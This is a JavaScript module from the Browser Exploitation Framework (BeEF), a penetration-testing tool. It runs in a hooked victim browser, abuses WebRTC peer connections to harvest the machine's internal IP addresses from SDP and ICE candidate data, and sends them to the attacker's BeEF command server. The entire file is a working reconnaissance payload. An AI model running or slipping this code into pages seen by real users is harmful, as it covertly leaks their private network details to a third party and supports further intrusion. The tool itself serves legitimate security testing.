//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

   var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

	if (RTCPeerConnection){

	    var addrs = Object.create(null);
	    addrs["0.0.0.0"] = false;

	    // Construct RTC peer connection
	    var servers = {iceServers:[]};
	    var mediaConstraints = {optional:[{googIPv6: true}]};
	    var rtc = new RTCPeerConnection(servers, mediaConstraints);
	    rtc.createDataChannel('', {reliable:false});

	    // Upon an ICE candidate being found
	    // Grep the SDP data for IP address data
	    rtc.onicecandidate = function (evt) {
	      if (evt.candidate){
	        beef.debug("a="+evt.candidate.candidate);
	        grepSDP("a="+evt.candidate.candidate);
			retResults();
	      }
	    };

	    // Create an SDP offer
	    rtc.createOffer(function (offerDesc) {
	        grepSDP(offerDesc.sdp);
	        rtc.setLocalDescription(offerDesc);
			retResults();
	    }, function (e) {
	        beef.debug("SDP Offer Failed");
	        beef.net.send('<%= @command_url %>', <%= @command_id %>, "SDP Offer Failed", beef.are.status_error());
        });

		function retResults(){
			var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });

			// This is for the ARE, as this module is async, so we can't just return as we would in a normal sync way
			get_internal_ip_webrtc_mod_output = [beef.are.status_success(), displayAddrs.join(",")];
		}

	    // Return results
	    function processIPs(newAddr) {
	        if (newAddr in addrs) return;
	        else addrs[newAddr] = true;
	        var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
	        beef.debug("Found IPs: "+ displayAddrs.join(","));
	        beef.net.send('<%= @command_url %>', <%= @command_id %>, "IP is " + displayAddrs.join(","), beef.are.status_success());
	    }


	    // Retrieve IP addresses from SDP 
	    function grepSDP(sdp) {
	        var hosts = [];
	        sdp.split('\r\n').forEach(function (line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
	            if (~line.indexOf("a=candidate")) {     // http://tools.ietf.org/html/rfc4566#section-5.13
	                var parts = line.split(' '),        // http://tools.ietf.org/html/rfc5245#section-15.1
	                    addr = parts[4],
	                    type = parts[7];
	                if (type === 'host') processIPs(addr);
	            } else if (~line.indexOf("c=")) {       // http://tools.ietf.org/html/rfc4566#section-5.7
	                var parts = line.split(' '),
	                    addr = parts[2];
	                processIPs(addr);
	            }
	        });
	    }
	}else {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, "Browser doesn't appear to support RTCPeerConnection", beef.are.status_error());
	}
});
